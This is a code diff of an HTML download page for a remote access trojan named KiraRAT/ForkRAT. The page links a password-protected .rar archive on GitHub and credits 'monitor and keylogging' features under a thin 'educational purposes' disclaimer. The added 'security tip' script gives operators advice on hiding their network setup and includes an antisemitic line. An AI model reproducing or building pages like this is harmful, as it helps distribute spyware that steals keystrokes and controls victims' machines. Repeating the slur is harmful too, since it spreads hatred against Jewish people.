@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ForkRAT</title>
+    <title>KiraOnTop</title>
     <style>
         body {
             background-color: black;
@@ -31,6 +31,7 @@
             text-decoration: none;
             display: inline-block;
             transition: 0.3s;
+            animation: pulse 2s infinite;
         }
         .btn:hover {
             background: #00ff00;
@@ -50,12 +51,23 @@
             font-size: 14px;
             opacity: 0.8;
         }
+        ul li {
+            transition: transform 0.3s ease;
+        }
+        ul li:hover {
+            transform: scale(1.1);
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
     </style>
 </head>
 <body>
-    <h1>Welcome to Kira</h1>
+    <h1 id="typewriter"></h1>
     <p>Click the button below to download KiraRAT 2.4</p>
-    <p>Passowrd: shix</p>
+    <p>Password: shix</p>
     <div class="btn-container">
         <a href="https://raw.githubusercontent.com/SurnameForfm32/QusarFork/refs/heads/main/ForkRat.rar" class="btn">Download ForkRAT 2.4</a>
     </div>
@@ -83,6 +95,11 @@
         </ul>
     </div>
 
+    <div class="section" onclick="showTip()">
+        <h2>Click for a Security Tip</h2>
+        <p id="tip">🔒</p>
+    </div>
+    
     <div class="credits">
         <h2>CREDITS</h2>
         <p>Monitor and keylogging - zen1en</p>
@@ -91,7 +108,37 @@
         <p>UI - shix</p>
         
         <h3>Disclaimer</h3>
-        <p>This software is provided strictly for educational and research purposes only. The developers and contributors of ForkRAT are not responsible for any actions taken using this tool. By using ForkRAT, you agree that you are solely responsible for ensuring that your usage complies with all applicable laws and ethical guidelines. The development team does not condone or support any illegal, unethical, or unauthorized activities, and we are not involved in how individuals choose to use this software. Any misuse of ForkRAT is entirely at the user's own risk, and the creators hold no liability for any consequences resulting from such actions.</p>
+        <p>This software is provided strictly for educational and research purposes only...</p>
     </div>
+    
+    <script>
+        const tips = [
+            "Use rdp or a good port forwarding software NEVER port forward from your router.",
+            "Enable two-factor authentication for extra security.",
+            "Only download from trusted sources",
+            "Keep your software updated to patch security vulnerabilities.",
+            "Just dont be a jew."
+        ];
+        
+        function showTip() {
+            document.getElementById("tip").innerText = tips[Math.floor(Math.random() * tips.length)];
+        }
+        
+        function typeWriterEffect(text, element, speed) {
+            let i = 0;
+            function type() {
+                if (i < text.length) {
+                    element.innerHTML += text.charAt(i);
+                    i++;
+                    setTimeout(type, speed);
+                }
+            }
+            type();
+        }
+        
+        window.onload = function() {
+            typeWriterEffect("Welcome to KiraRAT...", document.getElementById("typewriter"), 100);
+        };
+    </script>
 </body>
 </html>
